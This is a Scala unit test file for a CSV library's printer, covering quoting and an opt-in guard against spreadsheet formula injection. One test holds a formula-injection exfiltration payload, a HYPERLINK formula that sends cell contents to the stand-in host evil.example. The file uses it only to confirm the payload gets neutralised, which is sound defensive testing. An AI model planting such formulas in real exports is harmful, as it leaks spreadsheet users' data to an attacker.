package io.chrisdavenport.cormorant

import _root_.cats.data._

class PrinterSpec extends munit.FunSuite {

  test("Print a simple csv") {
    val csv = CSV.Complete(
      CSV.Headers(
        NonEmptyList.of(CSV.Header("Color"), CSV.Header("Food"), CSV.Header("Number"))
      ),
      CSV.Rows(
        List(
          CSV.Row(NonEmptyList.of(CSV.Field("Blue"), CSV.Field("Pizza"), CSV.Field("1"))),
          CSV.Row(NonEmptyList.of(CSV.Field("Red"), CSV.Field("Margarine"), CSV.Field("2"))),
          CSV.Row(NonEmptyList.of(CSV.Field("Yellow"), CSV.Field("Broccoli"), CSV.Field("3")))
        )
      )
    )
    val expectedCSVString = """Color,Food,Number
    |Blue,Pizza,1
    |Red,Margarine,2
    |Yellow,Broccoli,3""".stripMargin

    assertEquals(Printer.default.print(csv), expectedCSVString)
  }

  test("Printer field with a surrounded field") {
    val csv = CSV.Field("Snow, John")
    val expectedCSVString = "\"Snow, John\""

    assertEquals(Printer.default.print(csv), expectedCSVString)
  }

  test("Printer field with escaped field") {
    val csv = CSV.Field("Snow, \"John\"")
    val expectedCSVString = "\"Snow, \"\"John\"\"\""

    assertEquals(Printer.default.print(csv), expectedCSVString)
  }

  test("default printer leaves formula-looking values alone") {
    // The default must not change what it emits; escaping is opt-in.
    assertEquals(Printer.default.print(CSV.Field("=1+1")), "=1+1")
    assertEquals(Printer.default.print(CSV.Field("+1")), "+1")
    assertEquals(Printer.default.print(CSV.Field("-1")), "-1")
    assertEquals(Printer.default.print(CSV.Field("@SUM(A1)")), "@SUM(A1)")
  }

  test("formula-escaping printer prefixes values a spreadsheet would evaluate") {
    val p = Printer.defaultEscapingFormulas
    assertEquals(p.print(CSV.Field("=1+1")), "'=1+1")
    assertEquals(p.print(CSV.Field("+1")), "'+1")
    assertEquals(p.print(CSV.Field("-1")), "'-1")
    assertEquals(p.print(CSV.Field("@SUM(A1)")), "'@SUM(A1)")
  }

  test("formula-escaping printer guards the classic exfiltration payload") {
    val payload = """=HYPERLINK("http://evil.example/?"&A1,"click")"""
    val printed = Printer.defaultEscapingFormulas.print(CSV.Field(payload))
    // The payload contains quotes, so it is also RFC 4180 surrounded; the
    // formula guard belongs inside that surrounding.
    assert(printed.startsWith("\"'="), s"formula not neutralised: $printed")
  }

  test("formula-escaping printer leaves ordinary values untouched") {
    val p = Printer.defaultEscapingFormulas
    assertEquals(p.print(CSV.Field("Pizza")), "Pizza")
    assertEquals(p.print(CSV.Field("1")), "1")
    // A formula character that is not leading is not a formula.
    assertEquals(p.print(CSV.Field("A=B")), "A=B")
  }

  test("formula escaping composes with RFC 4180 surrounding") {
    // The added quote belongs inside the surrounding quotes, not outside.
    val printed = Printer.defaultEscapingFormulas.print(CSV.Field("=1,2"))
    assertEquals(printed, "\"'=1,2\"")
  }

  test("headers are escaped too") {
    assertEquals(Printer.defaultEscapingFormulas.print(CSV.Header("=1+1")), "'=1+1")
  }

  test("tsv variant escapes formulas as well") {
    assertEquals(Printer.tsvEscapingFormulas.print(CSV.Field("=1+1")), "'=1+1")
  }
}
